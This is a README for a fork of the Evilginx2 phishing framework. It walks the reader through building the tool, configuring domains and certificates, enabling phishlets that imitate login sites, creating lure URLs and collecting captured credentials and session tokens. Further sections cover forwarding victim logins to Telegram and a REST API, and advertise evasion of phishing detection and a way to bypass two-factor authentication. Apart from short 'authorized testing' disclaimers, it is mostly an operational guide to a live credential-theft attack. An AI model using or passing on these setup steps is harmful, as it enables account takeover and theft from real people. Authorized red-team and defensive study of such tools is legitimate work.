<p align="center">
  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
  <p align="center">
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />
  </p>
</p>

# BenevolentGinx2 (Enhanced Community Edition)

This repository is a community-enhanced fork of [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2). It adds QoL features (REST API, Botguard, notifications, obfuscation, website spoofing, AES-256 encryption, multi-domain support, named proxy profiles) while remaining fully open source. **Original work by Kuba Gretzky; this project is released under the same [BSD-3-Clause license](LICENSE).**

## How to Use BenevolentGinx2

Use only for authorized testing. This guide walks you through running the tool and generating your first phishing link.

### 1. Prerequisites

- **Server** with a public IP (VPS or cloud instance).
- **Domain name** you control (e.g. `yourdomain.com`).
- **DNS**: Ability to add A records (and optionally NS for a subdomain) pointing to your server IP.
- **Go 1.16+** (to build), or a pre-built binary.

### 2. Build and Run

```bash
# Clone (or use your existing copy)
git clone https://github.com/patrick-projects/BenevolentGinx2.git
cd BenevolentGinx2

# Build
make build
# Or: go build -o evilginx

# Run (creates config in current directory)
./evilginx
```

When it starts, you'll see the banner and an **Enhanced Edition** line with quick hints. Type `help` for commands.

### 3. First-Time Configuration

At the `evilginx` prompt, set the basics:

| Step | Command | Example |
|------|--------|--------|
| Base domain | `config domain <domain>` | `config domain yourdomain.com` |
| Server IP | `config ipv4 external <ip>` | `config ipv4 external 203.0.113.10` |
| Redirect for unauthorized visitors | `config unauth_url <url>` | `config unauth_url https://google.com` |

**DNS:** Create an A record so your phishing hostnames resolve to your server (e.g. `login.yourdomain.com` → your server IP). You can also use a subdomain and point NS to your server if using the built-in DNS.

**Certificates:** With a real domain and port 80/443 open, enable Let's Encrypt:

```
config autocert on
```

Check settings with `config`.

### 4. Phishlets: Pick One and Enable It

**Phishlets** define which site you're imitating (e.g. Microsoft, Google). The repo does not ship third-party phishlets; add `.yaml` phishlet files to the `phishlets/` directory (create it if needed), then in the CLI:

```
phishlets
phishlets hostname <name> <host>    # e.g. phishlets hostname o365 login.yourdomain.com
phishlets enable <name>
phishlets
```

Fix any certificate or hostname errors shown in the status.

### 5. Create a Lure and Get a Phishing URL

A **lure** is a specific landing path you'll send to targets.

```
lures create <phishlet>
lures
lures get-url <id>    # use the id from lures (e.g. 0)
```

Use the generated URL in your campaign. When someone opens it and signs in, the session is captured.

### 6. View Captured Sessions

```
sessions
sessions <id>    # tokens and details for one session
```

### 7. Optional: Notifications (e.g. Telegram)

Real-time alerts when someone clicks a lure or submits credentials:

```
notify create mybot telegram
notify set mybot bot_token <YOUR_BOT_TOKEN>
notify set mybot chat_id <YOUR_CHAT_ID>
notify enable mybot
notify test mybot
```

- **Bot token:** Create a bot with [@BotFather](https://t.me/BotFather).
- **Chat ID:** Send a message to your bot, then open `https://api.telegram.org/bot<TOKEN>/getUpdates` and read `chat.id`.

More: `help notify`.

### 8. Optional: REST API

```
api key <your-secret-key>
api secret_path /your-secret-path
api enable
```

Then call e.g. `https://yourdomain.com/your-secret-path/api/sessions` with header `X-Api-Key: <your-secret-key>`. More: `help api`.

### 9. Optional: Bot Detection (Botguard)

```
botguard enable
botguard js_challenge on    # optional "Verifying browser..." step for first-time visitors
```

More: `help botguard`.

### 10. Quick Reference

| Goal | Command |
|------|--------|
| See all config | `config` |
| List phishlets | `phishlets` |
| Set hostname & enable | `phishlets hostname <name> <host>` then `phishlets enable <name>` |
| List lures | `lures` |
| Create lure | `lures create <phishlet>` |
| Get phishing URL | `lures get-url <id>` |
| View sessions | `sessions` |
| In-app help | `help`, `help <command>` |

**More information:** [help.evilginx.com](https://help.evilginx.com) (concepts, phishlets). Phishlets are not included in this repo; obtain from community or official sources and place in `phishlets/`.

---

# Evilginx 3.0 (base)

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.

<p align="center">
  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
</p>

## Disclaimer

I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.


### Key features:

- Out-of-the-box **phishing detection evasion** (including Chrome's Enchanced Browser Protection)
- Tested and maintained **official phishlets database**
- **Botguard** to **prevent bot traffic** by default (same concept as Cloudflare Turnstile)
- **Evilpuppet** for advanced phishing capability (Google)
- External **DNS providers** with multi-domain support
- **Website spoofing** for unauthorized requests
- **JavaScript** & **HTML obfuscation**
- **Wildcard TLS certificates**
- **Automated** server deployment
- **SQLite** database support


## License

**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under BSD-3 license.
